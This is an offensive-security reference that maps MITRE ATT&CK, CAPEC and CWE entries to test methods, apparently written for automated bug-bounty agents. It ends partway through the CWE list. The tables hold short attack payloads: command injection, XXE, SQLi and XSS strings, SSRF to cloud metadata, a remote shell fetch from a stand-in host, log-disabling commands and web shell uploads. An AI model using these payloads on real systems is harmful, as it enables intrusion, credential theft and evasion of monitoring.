# ATTACK METHODS DATABASE
## Alpha's Complete Attack Knowledge Base

> **Version:** 1.0 | **Date:** 2026-04-18
> **Sources:** MITRE ATT&CK v14, CAPEC v3.9, CWE Top 25 (2023), OWASP Top 10 (2021), OWASP API Top 10 (2023), OWASP Mobile Top 10 (2024)
> **Purpose:** Every attack method that exists, documented and ready for the wolf pack.

---

# TABLE OF CONTENTS

1. [MITRE ATT&CK Enterprise Tactics & Techniques](#1-mitre-attck-enterprise-tactics--techniques)
2. [CAPEC Top 50 Attack Patterns](#2-capec-top-50-attack-patterns)
3. [CWE Top 50 Weaknesses](#3-cwe-top-50-weaknesses)
4. [OWASP Top 10 (2021)](#4-owasp-top-10-2021)
5. [OWASP API Security Top 10 (2023)](#5-owasp-api-security-top-10-2023)
6. [OWASP Mobile Top 10 (2024)](#6-owasp-mobile-top-10-2024)
7. [Cross-Reference Matrix](#7-cross-reference-matrix)

---

# 1. MITRE ATT&CK ENTERPRISE TACTICS & TECHNIQUES

## Tactic Overview

| ID | Tactic | Description |
|---|---|---|
| TA0043 | Reconnaissance | Gathering info to plan operations |
| TA0042 | Resource Development | Establishing resources for operations |
| TA0001 | Initial Access | Getting into the network |
| TA0002 | Execution | Running malicious code |
| TA0003 | Persistence | Maintaining foothold |
| TA0004 | Privilege Escalation | Gaining higher-level permissions |
| TA0005 | Defense Evasion | Avoiding detection |
| TA0006 | Credential Access | Stealing credentials |
| TA0007 | Discovery | Figuring out the environment |
| TA0008 | Lateral Movement | Moving through the environment |
| TA0009 | Collection | Gathering target data |
| TA0011 | Command and Control | Communicating with compromised systems |
| TA0010 | Exfiltration | Stealing data out |
| TA0040 | Impact | Manipulate, interrupt, or destroy systems |

---

## TA0043 — RECONNAISSANCE

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1595 | Active Scanning | Scanning IP blocks, vuln scanning target infrastructure | Network/Cloud | Nmap, Masscan, Shodan queries against scope |
| T1595.001 | Scanning IP Blocks | Systematically scanning ranges for live hosts | Network | Masscan for port discovery, then targeted Nmap |
| T1595.002 | Vulnerability Scanning | Running vuln scanners against target | Web/API/Network | Nuclei, Nikto, or custom wolves against endpoints |
| T1595.003 | Wordlist Scanning | Brute-forcing directories, subdomains, parameters | Web/API | ffuf, gobuster, custom wordlists for dirs/params |
| T1592 | Gather Victim Host Info | OS, hardware, software, patches, architecture | Network/Cloud | Banner grabbing, HTTP headers, Wappalyzer |
| T1592.001 | Hardware | Identifying physical hardware | Network | SNMP enumeration, banner analysis |
| T1592.002 | Software | Identifying running software and versions | Web/Network | HTTP Server headers, `/robots.txt`, error pages |
| T1592.004 | Client Configurations | Browser/client config details | Web | JavaScript analysis, feature detection |
| T1589 | Gather Victim Identity Info | Emails, credentials, names, roles | Web/API | OSINT, LinkedIn, GitHub commits, HaveIBeenPwned |
| T1589.001 | Credentials | Finding leaked/exposed credentials | Web/API | Credential stuffing lists, paste sites, GitHub dorks |
| T1589.002 | Email Addresses | Harvesting email addresses | Web | Hunter.io, theHarvester, Google dorks |
| T1590 | Gather Victim Network Info | DNS, IP ranges, network topology | Network/Cloud | DNS enumeration, whois, BGP, certificate transparency |
| T1590.001 | Domain Properties | WHOIS, registrar, DNS records | Web/Network | `dig`, `whois`, SecurityTrails, crt.sh |
| T1590.002 | DNS | DNS records, zone transfers | Network | `dig axfr`, `dnsenum`, subdomain brute force |
| T1590.004 | Network Topology | Mapping internal network layout | Network | Traceroute, CDN detection, reverse DNS |
| T1591 | Gather Victim Org Info | Business relationships, org structure, locations | Web | LinkedIn, Crunchbase, SEC filings, job postings |
| T1593 | Search Open Websites/Domains | Using public sites for recon | Web | Google dorks, GitHub search, Wayback Machine |
| T1593.001 | Social Media | Mining social media for intel | Web | LinkedIn, Twitter, employee posts with tech details |
| T1593.002 | Search Engines | Using search engines for target info | Web | Google dorks: `site:target.com filetype:pdf` |
| T1593.003 | Code Repositories | Searching public repos for secrets | Web/API | GitHub/GitLab search for API keys, `.env` files |
| T1596 | Search Open Technical DBs | Scanning Shodan, Censys, public DBs | Network/Cloud | Shodan `org:target`, Censys, FOFA queries |
| T1597 | Search Closed Sources | Threat intel, dark web, paid DBs | All | Recorded Future, IntelX, dark web monitoring |
| T1598 | Phishing for Information | Social engineering for credentials/info | Web | Pretexting, spear-phishing (out of scope for bounty) |

---

## TA0001 — INITIAL ACCESS

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1190 | Exploit Public-Facing Application | Exploiting vulns in internet-facing apps | Web/API/Cloud | SQLi, RCE, SSRF, deserialization against live endpoints |
| T1133 | External Remote Services | Exploiting VPN, RDP, SSH, Citrix | Network | Brute force, default creds, CVE exploits on VPN/RDP |
| T1078 | Valid Accounts | Using legitimate credentials | Web/API/Cloud | Credential stuffing, default creds, leaked creds |
| T1078.001 | Default Accounts | Factory default credentials | Web/Network | admin:admin, test:test, known defaults per product |
| T1078.004 | Cloud Accounts | Compromised cloud identities | Cloud | AWS key leaks, Azure token theft, GCP SA key exposure |
| T1189 | Drive-by Compromise | Exploiting browser via malicious site | Web | XSS chains leading to credential theft |
| T1195 | Supply Chain Compromise | Compromising upstream dependencies | Web/API | Dependency confusion, typosquatting, malicious packages |
| T1195.001 | Compromise Software Dependencies | Poisoning libraries/packages | Web/API | Check for unpinned deps, lockfile manipulation |
| T1195.002 | Compromise Software Supply Chain | Infecting build pipelines | Cloud | CI/CD pipeline injection, build system compromise |
| T1199 | Trusted Relationship | Abusing partner/vendor access | Cloud/API | Third-party integrations, OAuth app abuse |
| T1566 | Phishing | Malicious emails/messages | Web | (Social engineering — typically out of bounty scope) |
| T1566.002 | Spearphishing Link | Targeted malicious links | Web | Craft convincing phishing pages (authorized tests only) |

---

## TA0002 — EXECUTION

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1059 | Command and Scripting Interpreter | Executing commands via interpreters | Web/API/Cloud | OS command injection via user input fields |
| T1059.001 | PowerShell | Executing PowerShell commands | Network | Test for PS injection in Windows-facing apps |
| T1059.003 | Windows Command Shell | cmd.exe execution | Network | Command injection: `; whoami`, `| dir` |
| T1059.004 | Unix Shell | Bash/sh execution | Web/API | `; id`, `` `whoami` ``, `$(cat /etc/passwd)` |
| T1059.006 | Python | Python code execution | Web/API | `__import__('os').system('id')` in eval contexts |
| T1059.007 | JavaScript | JS execution server-side | Web/API | Node.js injection, SSTI in JS template engines |
| T1059.009 | Cloud API | Executing via cloud APIs | Cloud | AWS CLI abuse, Azure PowerShell, GCP gcloud |
| T1203 | Exploitation for Client Execution | Exploiting client software bugs | Web | Browser exploits, PDF exploits, Office macro (out of typical scope) |
| T1047 | Windows Management Instrumentation | WMI for execution | Network | WMI queries via compromised endpoints |
| T1204 | User Execution | Tricking users into running code | Web | Social engineering, malicious file upload |
| T1204.001 | Malicious Link | User clicks malicious link | Web | XSS links, open redirect chains |
| T1204.002 | Malicious File | User opens malicious file | Web | SVG upload with JS, HTML file upload, polyglots |
| T1610 | Deploy Container | Deploying malicious containers | Cloud | Kubernetes pod creation, Docker socket abuse |
| T1648 | Serverless Execution | Abusing serverless functions | Cloud | Lambda injection, Azure Functions abuse |

---

## TA0003 — PERSISTENCE

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1098 | Account Manipulation | Modifying accounts for persistence | Web/API/Cloud | Add SSH keys, change email, add MFA device to victim |
| T1098.001 | Additional Cloud Credentials | Adding cloud API keys | Cloud | Create new AWS access key, Azure service principal |
| T1098.003 | Additional Cloud Roles | Assigning roles for persistence | Cloud | IAM role attachment, GCP role binding |
| T1136 | Create Account | Creating new accounts | Web/API/Cloud | Self-registration bypass, admin account creation |
| T1136.001 | Local Account | Creating OS-level accounts | Network | `net user /add` via RCE |
| T1136.003 | Cloud Account | Creating cloud IAM users | Cloud | `aws iam create-user` via compromised creds |
| T1505 | Server Software Component | Implanting web shells, modules | Web | Web shell upload, malicious plugin install |
| T1505.003 | Web Shell | Uploading web shell for persistence | Web | Upload .php/.jsp/.aspx shell via file upload vuln |
| T1505.004 | IIS Components | Malicious IIS modules | Web | IIS module injection (requires server access) |
| T1556 | Modify Authentication Process | Tampering with auth mechanisms | Web/API | OAuth flow manipulation, SAML response modification |
| T1556.006 | Multi-Factor Authentication | Bypassing/disabling MFA | Web/API | MFA fatigue, response manipulation, backup code abuse |
| T1556.009 | Conditional Access Policies | Bypassing conditional access | Cloud | User-agent spoofing, IP allowlist bypass |
| T1078 | Valid Accounts | Using stolen creds for persistence | All | Maintain access via legitimate credentials |
| T1053 | Scheduled Task/Job | Creating scheduled tasks | Network/Cloud | Cron jobs, cloud scheduled functions |
| T1053.007 | Container Orchestration Job | Kubernetes CronJobs | Cloud | Create K8s CronJob for persistent execution |

---

## TA0004 — PRIVILEGE ESCALATION

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1548 | Abuse Elevation Control Mechanism | Bypassing privilege controls | Web/API/Cloud | IDOR to admin, role parameter manipulation |
| T1548.002 | Bypass User Account Control | UAC bypass | Network | (OS-level, rarely in-scope for web bounty) |
| T1548.005 | Temporary Elevated Cloud Access | Abusing temporary token escalation | Cloud | AWS AssumeRole chains, GCP impersonation |
| T1078 | Valid Accounts | Using higher-priv stolen accounts | All | Credential reuse, admin account takeover |
| T1078.004 | Cloud Accounts | Cloud admin credential abuse | Cloud | Pivot from dev to prod via shared creds |
| T1068 | Exploitation for Privilege Escalation | Exploiting software vulns for privesc | All | Kernel exploits, container escape, app-level privesc |
| T1134 | Access Token Manipulation | Forging/stealing tokens | Web/API/Cloud | JWT manipulation, OAuth token theft, SAML forging |
| T1134.001 | Token Impersonation/Theft | Stealing and reusing tokens | Web/API | Session hijacking, token replay |
| T1611 | Escape to Host | Container breakout | Cloud | Container escape via mounted Docker socket, CVEs |
| T1484 | Domain/Tenant Policy Modification | Modifying domain policies | Cloud | Azure AD policy modification, conditional access bypass |
| T1484.002 | Trust Modification | Modifying trust relationships | Cloud | Federation trust manipulation |
| T1574 | Hijack Execution Flow | DLL hijacking, path interception | Network | DLL sideloading, LD_PRELOAD injection |

---

## TA0005 — DEFENSE EVASION

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1027 | Obfuscated Files or Information | Encoding/encrypting payloads | Web/API | Base64 encode payloads, Unicode normalization bypass |
| T1027.010 | Command Obfuscation | Obfuscating commands to bypass filters | Web | `w\h\o\a\m\i`, `$(printf '\x69\x64')`, case toggling |
| T1070 | Indicator Removal | Clearing logs and artifacts | Network/Cloud | Log deletion, CloudTrail tampering |
| T1070.004 | File Deletion | Removing files to cover tracks | Network | Delete uploaded shells after use |
| T1078 | Valid Accounts | Using legit accounts to blend in | All | Actions under legitimate user context |
| T1036 | Masquerading | Making things look legitimate | Web/API | Rename payloads to look benign, spoof content-type |
| T1036.005 | Match Legitimate Name or Location | Naming files to match expected patterns | Web | Upload shell as `update.php` or `config.bak` |
| T1562 | Impair Defenses | Disabling security tools | Cloud/Network | Disable WAF rules, turn off logging, kill EDR |
| T1562.001 | Disable or Modify Tools | Turning off security software | Network | AV evasion, EDR tampering |
| T1562.007 | Disable or Modify Cloud Firewall | Modifying cloud security groups | Cloud | Open SG rules, modify NACLs |
| T1562.008 | Disable or Modify Cloud Logs | Turning off CloudTrail/Stackdriver | Cloud | `aws cloudtrail stop-logging` |
| T1550 | Use Alternate Authentication Material | Non-password auth abuse | Web/API/Cloud | Pass-the-hash, pass-the-ticket, stolen JWT/cookie |
| T1550.001 | Application Access Token | Using stolen OAuth/API tokens | Web/API/Cloud | Reuse bearer tokens, API keys from JS files |
| T1218 | System Binary Proxy Execution | Using trusted binaries for execution | Network | LOLBins: certutil, mshta, regsvr32 |
| T1480 | Execution Guardrails | Environment-specific triggers | All | (Defense technique, less relevant for testing) |
| T1556 | Modify Authentication Process | Subverting auth checks | Web/API | Parameter manipulation to bypass auth |
| T1600 | Weaken Encryption | Downgrading encryption | Network | SSL downgrade attacks, cipher suite manipulation |

---

## TA0006 — CREDENTIAL ACCESS

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1110 | Brute Force | Trying many passwords | Web/API | Credential stuffing, password spraying |
| T1110.001 | Password Guessing | Guessing passwords | Web/API | Common passwords against login endpoints |
| T1110.002 | Password Cracking | Offline hash cracking | Network | Crack hashes found in exposed DBs/backups |
| T1110.003 | Password Spraying | One password, many accounts | Web/API | `Password1!` across all discovered emails |
| T1110.004 | Credential Stuffing | Leaked creds against target | Web/API | Breach databases against login endpoints |
| T1539 | Steal Web Session Cookie | Stealing session tokens | Web | XSS + `document.cookie`, cookie theft via MITM |
| T1528 | Steal Application Access Token | Stealing OAuth/API tokens | Web/API/Cloud | Token leakage in URL, referer, JS source, logs |
| T1552 | Unsecured Credentials | Finding plaintext credentials | Web/API/Cloud | `.env` files, config files, hardcoded creds in JS |
| T1552.001 | Credentials In Files | Creds in config/source files | Web/API | Search repos for passwords, API keys in JS bundles |
| T1552.005 | Cloud Instance Metadata API | AWS/GCP metadata service | Cloud | SSRF to `169.254.169.254` for IAM creds |
| T1552.007 | Container API | Kubernetes secrets, Docker env | Cloud | `/var/run/secrets/`, K8s API server queries |
| T1555 | Credentials from Password Stores | Extracting saved passwords | Network | Browser password extraction, keychain access |
| T1557 | Adversary-in-the-Middle | Intercepting auth traffic | Network | ARP spoofing, DNS poisoning, SSL stripping |
| T1557.003 | DHCP Spoofing | Rogue DHCP for MITM | Network | DHCP spoofing on local network |
| T1558 | Steal or Forge Kerberos Tickets | Kerberoasting, golden ticket | Network | Kerberoast service accounts, AS-REP roasting |
| T1558.003 | Kerberoasting | Requesting TGS for cracking | Network | `GetUserSPNs.py` for service account hashes |
| T1606 | Forge Web Credentials | Creating fake auth tokens | Web/API | JWT forging (none alg, key confusion, weak secret) |
| T1606.001 | Web Cookies | Forging session cookies | Web | Predictable session tokens, cookie signing bypass |
| T1606.002 | SAML Tokens | Forging SAML assertions | Web/Cloud | SAML response manipulation, signature wrapping |
| T1621 | Multi-Factor Authentication Request Generation | MFA bombing/fatigue | Web | Repeated MFA push requests (authorized testing only) |

---

## TA0007 — DISCOVERY

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1087 | Account Discovery | Enumerating user accounts | Web/API/Cloud | User enumeration via login/register/reset responses |
| T1087.004 | Cloud Account | Enumerating cloud users | Cloud | AWS IAM enumeration, Azure AD user listing |
| T1580 | Cloud Infrastructure Discovery | Mapping cloud resources | Cloud | S3 bucket enumeration, Azure blob discovery |
| T1538 | Cloud Service Dashboard | Accessing cloud consoles | Cloud | AWS Console access via stolen creds |
| T1526 | Cloud Service Discovery | Enumerating cloud services | Cloud | AWS service enumeration, GCP project discovery |
| T1046 | Network Service Scanning | Port scanning and service discovery | Network | Nmap TCP/UDP scans, service version detection |
| T1135 | Network Share Discovery | Finding accessible shares | Network | SMB enumeration, NFS exports |
| T1040 | Network Sniffing | Capturing network traffic | Network | Packet capture for credential harvesting |
| T1069 | Permission Groups Discovery | Enumerating groups/roles | Web/API/Cloud | GraphQL introspection, API role enumeration |
| T1057 | Process Discovery | Listing running processes | Network | Process listing via RCE |
| T1018 | Remote System Discovery | Identifying other hosts | Network | ARP scanning, DNS resolution, ping sweep |
| T1518 | Software Discovery | Identifying installed software | Web/Network | Tech stack fingerprinting, Wappalyzer, headers |
| T1082 | System Information Discovery | Gathering system details | All | Server headers, error messages, API version endpoints |
| T1016 | System Network Configuration Discovery | Network config details | Network | `ifconfig`, routing tables via RCE |
| T1049 | System Network Connections Discovery | Active connections | Network | `netstat`, `ss` via RCE |
| T1033 | System Owner/User Discovery | Identifying logged-in users | Web/Network | User profile endpoints, `whoami` via RCE |
| T1007 | System Service Discovery | Listing services | Network | Service enumeration via RCE |
| T1613 | Container and Resource Discovery | Kubernetes/Docker recon | Cloud | K8s API queries, Docker socket enumeration |
| T1619 | Cloud Storage Object Discovery | Enumerating cloud storage | Cloud | S3 listing, GCS bucket enumeration, Azure blob listing |

---

## TA0008 — LATERAL MOVEMENT

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1210 | Exploitation of Remote Services | Exploiting services to move | Network | EternalBlue, BlueKeep, Log4Shell on internal services |
| T1534 | Internal Spearphishing | Phishing internal users | Web | Account takeover then phish other users |
| T1570 | Lateral Tool Transfer | Moving tools between systems | Network | Upload tools via compromised hosts |
| T1021 | Remote Services | Using remote access protocols | Network | SSH, RDP, WinRM pivoting |
| T1021.001 | Remote Desktop Protocol | RDP lateral movement | Network | RDP with stolen creds |
| T1021.004 | SSH | SSH lateral movement | Network/Cloud | SSH key reuse, agent forwarding abuse |
| T1021.006 | Windows Remote Management | WinRM lateral movement | Network | `Enter-PSSession` with creds |
| T1550 | Use Alternate Authentication Material | Token/hash reuse for lateral movement | All | Pass-the-hash, pass-the-cookie |
| T1550.001 | Application Access Token | Reusing API tokens | Web/API/Cloud | Bearer token reuse across microservices |
| T1563 | Remote Service Session Hijacking | Hijacking active sessions | Network | Session stealing, RDP hijacking |

---

## TA0009 — COLLECTION

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1530 | Data from Cloud Storage | Accessing cloud storage data | Cloud | Read S3 buckets, GCS objects, Azure blobs |
| T1213 | Data from Information Repositories | Extracting data from repos/wikis | Web/Cloud | SharePoint, Confluence, wiki scraping |
| T1213.003 | Code Repositories | Data from Git repos | Web/Cloud | GitHub/GitLab private repo access via stolen tokens |
| T1005 | Data from Local System | Collecting local files | Network | File read via LFI, path traversal |
| T1039 | Data from Network Shared Drive | Accessing shared storage | Network | SMB share enumeration and file access |
| T1114 | Email Collection | Accessing email systems | Web/Cloud | OWA access, Graph API email read |
| T1114.002 | Remote Email Collection | Reading email via API | Cloud | Microsoft Graph API, Gmail API with stolen OAuth |
| T1185 | Browser Session Hijacking | Injecting into browser sessions | Web | XSS to access same-origin resources |
| T1557 | Adversary-in-the-Middle | Intercepting data in transit | Network | Proxy interception, ARP spoofing |
| T1119 | Automated Collection | Scripted data gathering | All | Automated scraping, API enumeration scripts |

---

## TA0011 — COMMAND AND CONTROL

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1071 | Application Layer Protocol | C2 over HTTP/HTTPS/DNS | Network | HTTP-based C2 channels, DNS tunneling |
| T1071.001 | Web Protocols | C2 over HTTP/S | Web/Network | Reverse shell over HTTPS, WebSocket C2 |
| T1071.004 | DNS | C2 over DNS | Network | DNS tunneling, TXT record exfil |
| T1105 | Ingress Tool Transfer | Downloading tools to target | Network | `curl`, `wget`, `certutil` for payload delivery |
| T1572 | Protocol Tunneling | Tunneling through allowed protocols | Network | SSH tunneling, ICMP tunneling, DNS tunneling |
| T1090 | Proxy | Using proxies for C2 | Network | Multi-hop proxies, TOR, domain fronting |
| T1090.002 | External Proxy | External C2 proxies | Network | Cloud-hosted redirectors |
| T1090.004 | Domain Fronting | CDN abuse for C2 | Cloud | Using CDN domains to mask C2 traffic |
| T1102 | Web Service | C2 via legitimate web services | Web/Cloud | Slack/Discord/Telegram as C2 channels |
| T1568 | Dynamic Resolution | Dynamic C2 infrastructure | Network | DGA, DNS fast flux |
| T1573 | Encrypted Channel | Encrypted C2 comms | Network | Custom encryption, certificate pinning evasion |
| T1571 | Non-Standard Port | C2 on unusual ports | Network | HTTPS on port 8443, 4443, etc. |

---

## TA0010 — EXFILTRATION

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1048 | Exfiltration Over Alternative Protocol | Data theft via non-standard channels | Network | DNS exfil, ICMP exfil, SMTP exfil |
| T1048.002 | Exfiltration Over Asymmetric Encrypted Non-C2 Protocol | Exfil via HTTPS to external | Network/Cloud | Upload data to attacker-controlled HTTPS endpoint |
| T1567 | Exfiltration Over Web Service | Data theft via cloud services | Web/Cloud | Upload to S3, Google Drive, Dropbox, Pastebin |
| T1567.002 | Exfiltration to Cloud Storage | Upload stolen data to cloud | Cloud | AWS S3 upload, Azure blob upload |
| T1041 | Exfiltration Over C2 Channel | Data sent via C2 channel | Network | Embed data in C2 HTTP requests |
| T1029 | Scheduled Transfer | Timed data exfiltration | Network | Periodic automated data upload |
| T1537 | Transfer Data to Cloud Account | Move data between cloud accounts | Cloud | Copy S3 objects to attacker AWS account |
| T1020 | Automated Exfiltration | Scripted data theft | All | Auto-export via SSRF, API abuse |

---

## TA0040 — IMPACT

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1485 | Data Destruction | Deleting data | Web/API/Cloud | Mass deletion via API (e.g., `delete_user` endpoint) |
| T1486 | Data Encrypted for Impact | Ransomware | Network | (Out of scope for bounty) |
| T1565 | Data Manipulation | Modifying data for impact | Web/API | Balance manipulation, order tampering, price change |
| T1565.001 | Stored Data Manipulation | Modifying stored records | Web/API | Change other users' profiles, modify transactions |
| T1565.002 | Transmitted Data Manipulation | Modifying data in transit | Network | MITM request tampering |
| T1491 | Defacement | Modifying web content | Web | Stored XSS, content injection, admin panel compromise |
| T1491.002 | External Defacement | Public-facing defacement | Web | Homepage modification via admin takeover |
| T1498 | Network Denial of Service | Flooding network | Network | (Typically out of scope) |
| T1499 | Endpoint Denial of Service | Crashing services | Web/API | ReDoS, resource exhaustion, zip bombs |
| T1499.003 | Application Exhaustion Flood | Overwhelming application logic | Web/API | Expensive GraphQL queries, unthrottled API loops |
| T1499.004 | Application or System Exploitation | Crashing via exploitation | Web/API | Crash via malformed input, null pointer triggers |
| T1496 | Resource Hijacking | Using target resources (crypto mining) | Cloud | Cryptojacking via compromised cloud instances |
| T1531 | Account Access Removal | Locking users out | Web/API | Password reset takeover, email change, MFA lock |
| T1657 | Financial Theft | Direct financial impact | Web/API | Unauthorized transactions, balance transfer |

---

# 2. CAPEC TOP 50 ATTACK PATTERNS

Attack patterns most relevant to bug bounty and penetration testing.

## Injection Attacks

| ID | Name | Description | Applies To | How to Test |
|---|---|---|---|---|
| CAPEC-66 | SQL Injection | Inject SQL via user input to query/modify database | Web/API | `' OR 1=1--`, `UNION SELECT`, blind boolean/time-based |
| CAPEC-88 | OS Command Injection | Execute OS commands via unsanitized input | Web/API | `; id`, `| whoami`, `` `cat /etc/passwd` `` |
| CAPEC-250 | XML Injection | Inject malicious XML into XML parsers | Web/API | XML entity manipulation, tag injection |
| CAPEC-228 | DTD Injection (XXE) | External entity injection in XML parsers | Web/API | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| CAPEC-242 | Code Injection | Inject and execute arbitrary code | Web/API | `eval()` injection, template injection (SSTI) |
| CAPEC-63 | Cross-Site Scripting (XSS) | Inject client-side scripts | Web | `<script>alert(1)</script>`, event handler injection |
| CAPEC-86 | XSS via HTTP Headers | XSS through HTTP header reflection | Web | Host header injection, Referer-based XSS |
| CAPEC-243 | XSS Targeting HTML Attributes | XSS via attribute injection | Web | `" onfocus=alert(1) autofocus="`, `'onmouseover='alert(1)` |
| CAPEC-244 | XSS Targeting URI Placeholders | XSS via javascript: URIs | Web | `javascript:alert(1)` in href, src, action |
| CAPEC-245 | XSS Using Doubled Characters | Bypass filters with double encoding | Web | `%253Cscript%253E`, recursive filter bypass |
| CAPEC-588 | DOM-Based XSS | Client-side DOM manipulation XSS | Web | `location.hash` sinks, `innerHTML` with user data |
| CAPEC-101 | Server Side Include (SSI) Injection | Inject SSI directives | Web | `<!--#exec cmd="id" -->` |
| CAPEC-135 | Format String Injection | Exploit format string vulnerabilities | Web/API | `%x%x%x%x`, `%n` in C-based backends |
| CAPEC-136 | LDAP Injection | Inject LDAP queries | Web/API | `*)(uid=*))(|(uid=*` in search fields |
| CAPEC-676 | NoSQL Injection | Inject into NoSQL databases | Web/API | `{"$gt":""}`, `{"$regex":".*"}` in MongoDB queries |

## Authentication & Authorization Attacks

| ID | Name | Description | Applies To | How to Test |
|---|---|---|---|---|
| CAPEC-114 | Authentication Abuse | Exploiting flaws in authentication | Web/API | Default creds, auth bypass, session fixation |
| CAPEC-115 | Authentication Bypass | Completely bypassing authentication | Web/API | Forced browsing, direct API calls, JWT `none` alg |
| CAPEC-122 | Privilege Abuse | Misusing legitimate privileges | Web/API | IDOR, accessing other users' resources |
| CAPEC-233 | Privilege Escalation | Gaining unauthorized higher privileges | Web/API | Role parameter tampering, admin endpoint access |
| CAPEC-560 | Use of Known Domain Credentials | Reusing breached credentials | Web/API | Credential stuffing from breach databases |
| CAPEC-561 | Windows Admin Shares | Accessing C$, ADMIN$ shares | Network | `net use \\target\C$` with admin creds |
| CAPEC-600 | Credential Stuffing | Automated credential reuse | Web/API | Large-scale login attempts with breached creds |
| CAPEC-16 | Dictionary-based Password Attack | Brute forcing with wordlists | Web/API | `rockyou.txt`, custom wordlists, rule-based mutations |
| CAPEC-49 | Password Brute Forcing | Exhaustive password guessing | Web/API | Hydra, Burp Intruder against login endpoints |
| CAPEC-196 | Session Credential Falsification | Forging session tokens | Web/API | Predictable session IDs, JWT secret cracking |

## Information Disclosure

| ID | Name | Description | Applies To | How to Test |
|---|---|---|---|---|
| CAPEC-116 | Excavation | Extracting hidden data from responses | Web/API | Verbose errors, debug endpoints, stack traces |
| CAPEC-127 | Directory Indexing | Browsing exposed directories | Web | `/`, `.listing`, directory traversal |
| CAPEC-170 | Web Application Fingerprinting | Identifying technology stack | Web | HTTP headers, error pages, default files |
| CAPEC-497 | File Discovery | Finding sensitive files | Web | `.env`, `backup.sql`, `.git/HEAD`, `wp-config.php` |
| CAPEC-118 | Collect and Analyze Information | OSINT and recon data gathering | All | GitHub dorks, Wayback Machine, certificate transparency |
| CAPEC-285 | ICMP Echo Request Ping | Host discovery | Network | Ping sweep, ICMP-based discovery |
| CAPEC-300 | Port Scanning | Identifying open ports | Network | Nmap SYN/TCP/UDP scans |

## Request Manipulation

| ID | Name | Description | Applies To | How to Test |
|---|---|---|---|---|
| CAPEC-12 | Choosing Message Identifier | Manipulating message/request IDs | Web/API | IDOR: change `user_id=123` to `user_id=124` |
| CAPEC-21 | Exploitation of Trusted Identifiers | Abusing trusted session/request IDs | Web/API | Cookie manipulation, token replay |
| CAPEC-22 | Exploiting Trust in Client | Server trusts client-side validation | Web/API | Bypass client-side price/quantity validation |
| CAPEC-31 | Accessing/Intercepting/Modifying HTTP Cookies | Cookie tampering | Web | Modify cookie values, steal via XSS |
| CAPEC-33 | HTTP Request Smuggling | Desync front/backend request parsing | Web | `Transfer-Encoding` + `Content-Length` conflicts |
| CAPEC-34 | HTTP Response Splitting | Inject headers into response | Web | CRLF injection: `%0d%0a` in headers |
| CAPEC-39 | Manipulating Opaque Client-based Data Tokens | Tampering with client tokens | Web/API | JWT manipulation, encrypted cookie attacks |
| CAPEC-57 | Utilizing REST's Trust in the System Resource to Obtain Sensitive Data | API abuse | API | Mass assignment, parameter pollution |
| CAPEC-62 | Cross Site Request Forgery (CSRF) | Force authenticated actions | Web | Auto-submitting forms, CSRF token bypass |
| CAPEC-126 | Path Traversal | Navigate outside web root | Web/API | `../../../etc/passwd`, `..%2F..%2F..%2F` |

## Server-Side Attacks

| ID | Name | Description | Applies To | How to Test |
|---|---|---|---|---|
| CAPEC-664 | Server Side Request Forgery (SSRF) | Force server to make requests | Web/API/Cloud | URL parameters fetching `http://169.254.169.254/` |
| CAPEC-17 | Using Malicious Files | Upload malicious files | Web | Web shells, polyglots, SVG XSS, XXE via docx |
| CAPEC-71 | Using Unicode Encoding to Bypass Validation | Unicode normalization bypass | Web/API | Homoglyph attacks, UTF-8 overlong encoding |
| CAPEC-76 | Manipulating Web Input to File System Calls | LFI/RFI | Web | `?page=../../etc/passwd`, `?file=http://evil/shell` |
| CAPEC-153 | Input Data Manipulation | Modifying input to cause unexpected behavior | Web/API | Parameter tampering, mass assignment, type juggling |
| CAPEC-460 | HTTP Parameter Pollution | Duplicate parameters confuse parsers | Web/API | `?id=1&id=2` — different parsing by front/backend |

---

# 3. CWE TOP 50 WEAKNESSES

## CWE Top 25 Most Dangerous (2023)

| Rank | CWE ID | Name | Description | Applies To | How to Test |
|---|---|---|---|---|---|
| 1 | CWE-787 | Out-of-bounds Write | Writing data past buffer boundaries | Network/Mobile | Fuzzing binary protocols, memory corruption |
| 2 | CWE-79 | Cross-site Scripting (XSS) | Improper neutralization of input in web output | Web | Inject `<script>`, event handlers, in all inputs |
| 3 | CWE-89 | SQL Injection | Improper neutralization of SQL commands | Web/API | `' OR 1=1--`, `UNION SELECT`, sqlmap |
| 4 | CWE-416 | Use After Free | Referencing memory after it is freed | Network | Fuzzing, memory corruption exploits |
| 5 | CWE-78 | OS Command Injection | Improper neutralization of OS commands | Web/API | `; id`, `| cat /etc/passwd` in all input fields |
| 6 | CWE-20 | Improper Input Validation | Failure to validate input properly | All | Boundary values, special chars, unexpected types |
| 7 | CWE-125 | Out-of-bounds Read | Reading data past buffer boundaries | Network | Heartbleed-style info leaks, fuzzing |
| 8 | CWE-22 | Path Traversal | Improper limitation of pathname | Web/API | `../../../etc/passwd` in file parameters |
| 9 | CWE-352 | Cross-Site Request Forgery (CSRF) | Missing/broken anti-CSRF tokens | Web | Craft auto-submitting form, test token validation |
| 10 | CWE-434 | Unrestricted Upload of Dangerous File Type | No file type validation on uploads | Web | Upload `.php`, `.jsp`, `.aspx` web shells |
| 11 | CWE-862 | Missing Authorization | No authorization check on functions | Web/API | Access admin endpoints as regular user |
| 12 | CWE-476 | NULL Pointer Dereference | Dereferencing null pointer | Network | Send null/empty values in unexpected places |
| 13 | CWE-287 | Improper Authentication | Broken authentication mechanisms | Web/API | Auth bypass, JWT manipulation, session fixation |
| 14 | CWE-190 | Integer Overflow or Wraparound | Integer arithmetic overflow | Web/API | Send MAX_INT+1, negative values for quantities |
